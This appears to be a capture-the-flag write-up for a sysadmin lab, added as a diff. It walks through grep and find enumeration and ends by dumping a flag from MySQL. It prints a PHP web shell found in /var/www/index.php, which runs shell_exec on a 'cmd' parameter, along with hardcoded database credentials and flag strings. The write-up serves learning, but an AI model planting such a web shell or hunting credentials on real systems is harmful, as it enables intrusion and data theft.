@@ -1,0 +1,92 @@
+makeki
+
+I sshed as architect, I tried running a grep command to look for flags cuz their format seems to be fixed.
+
+architect@sysadmin-track:/$ grep -Ri "flag-" 2>/dev/null
+etc/rc.local:/bin/sh /root/backup.sh -u trinity -p Flag-7e0cfcf090a2fe53c97ea3edd3883d0d &
+etc/cloud/templates/resolv.conf.tmpl: {{flag-}}
+
+
+probably like the last flag, this flag is encoded into something asw. I tried the base64 flag in grep, but that didn't work asw.
+
+architect@sysadmin-track:/$ grep -R "RmxhZ" 2>/dev/null
+
+The challenge says to dig for flag, dig is a dns lookup tool, maybe i need to dig the domain given for the challenge??
+I did nslookup on the challenge domain and found nothing. But unintendly theres a flag in txt records or the parent domain. FLAG-305l9RR202HG695t6Y8ZU77xyq, this isn't the flag for our challenge though.
+at this point i had seen the processes running, i was manually enumerating directories as it says to dig. 
+I was trying all sorts of weird things.
+
+architect@sysadmin-track:/$ find / -type f -perm 4000 2>/dev/null
+architect@sysadmin-track:/$ find / -type f "*.txt" 2>/dev/null
+architect@sysadmin-track:/$ find / -type f *.txt 2>/dev/null
+architect@sysadmin-track:/$ find / -type f flag 2>/dev/null
+
+Lets see all the files that is readable and is owned by architect.
+
+architect@sysadmin-track:/$ find / -readable -user architect 2>/dev/null
+/dev/pts/0
+/sys/fs/cgroup/systemd/user.slice/user-1003.slice/user@1003.service
+/sys/fs/cgroup/systemd/user.slice/user-1003.slice/user@1003.service/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1003.slice/user@1003.service/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1003.slice/user@1003.service/cgroup.clone_children
+/sys/fs/cgroup/unified/user.slice/user-1003.slice/user@1003.service
+/sys/fs/cgroup/unified/user.slice/user-1003.slice/user@1003.service/cgroup.procs
+/sys/fs/cgroup/unified/user.slice/user-1003.slice/user@1003.service/cgroup.threads
+/sys/fs/cgroup/unified/user.slice/user-1003.slice/user@1003.service/cgroup.subtree_control
+/run/user/1003
+/var/www/index.php  [NOTICE]
+
+The index.php looked the odd one out from all the outputs. 
+Checking the content of index.php
+
+architect@sysadmin-track:/$ cat /var/www/index.php
+<?php
+if(isset($_GET['cmd'])) {
+  $res = shell_exec(urldecode($_GET['cmd']));
+  print_r(str_replace("\n", '<br />', $res));
+  exit();
+}
+$info = (object)array();
+$info->username = "arch";
+$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
+$id = 1003;
+
+
+we see that we now have credentials for using mysql.
+
+Using the creds and logging into mysql. We get the flag.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| arch               |
+| information_schema |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> use arch
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++----------------+
+| Tables_in_arch |
++----------------+
+| arch           |
+| flag           |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from flag;
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| FLAG-55548fdb24a6ef248d8fdfde2720f6bd |
++---------------------------------------+
+1 row in set (0.01 sec)
+
+
+
